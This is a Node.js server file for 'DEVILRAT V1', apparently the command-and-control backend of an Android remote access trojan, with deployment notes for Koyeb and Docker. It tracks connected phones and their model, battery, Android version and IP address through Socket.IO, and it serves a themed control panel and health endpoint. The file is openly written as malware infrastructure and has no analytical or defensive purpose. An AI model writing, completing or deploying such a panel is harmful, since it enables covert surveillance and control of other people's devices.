const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// DEVILRAT Database
const devices = new Map();
const commands = [];

// Middleware
app.use(express.json());
app.use(express.static("public"));

// API Routes
app.get("/health", (req, res) => {
  res.json({
    status: "online",
    service: "DEVILRAT V1 - Docker",
    devices: devices.size,
    uptime: process.uptime()
  });
});

app.get("/api/devices", (req, res) => {
  res.json(Array.from(devices.values()));
});

// Web Panel
app.get("/panel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "panel.html"));
});

app.get("/", (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html>
  <head><title>DEVILRAT V1</title>
  <style>
    body{background:#000;color:#ff0000;text-align:center;padding:50px;font-family:monospace}
    h1{font-size:2.5em;text-shadow:0 0 10px red}
    .btn{background:#8b0000;color:white;padding:15px 30px;margin:10px;border:none;border-radius:8px;font-size:1.2em}
  </style>
  </head>
  <body>
    <h1>👹 DEVILRAT V1 - DOCKER</h1>
    <p>Deployment: Koyeb + Docker</p>
    <p>Status: <span style="color:#00ff00;">ONLINE</span></p>
    <a href="/panel"><button class="btn">🚀 CONTROL PANEL</button></a>
    <a href="/health"><button class="btn">📊 HEALTH CHECK</button></a>
  </body>
  </html>
  `);
});

// Socket.IO
io.on("connection", (socket) => {
  console.log("New device connected:", socket.id);

  socket.on("register", (data) => {
    const device = {
      id: socket.id,
      model: data.model || "Unknown",
      battery: data.battery || "100%",
      android: data.android || "Unknown",
      ip: socket.handshake.address,
      connected: new Date().toISOString(),
      status: "online"
    };

    devices.set(socket.id, device);
    io.emit("device_update", device);
  });

  socket.on("disconnect", () => {
    const device = devices.get(socket.id);
    if (device) {
      device.status = "offline";
      io.emit("device_update", device);
      devices.delete(socket.id);
    }
  });
});

// ====== FIX UTAMA UNTUK KOYEB ======
const PORT = process.env.PORT || 8080;

// WAJIB 0.0.0.0
server.listen(PORT, "0.0.0.0", () => {
  console.log(`
👹 DEVILRAT V1 - KOYEB READY
📡 Server running on port ${PORT}
✅ Device should appear in Koyeb panel
  `);
});
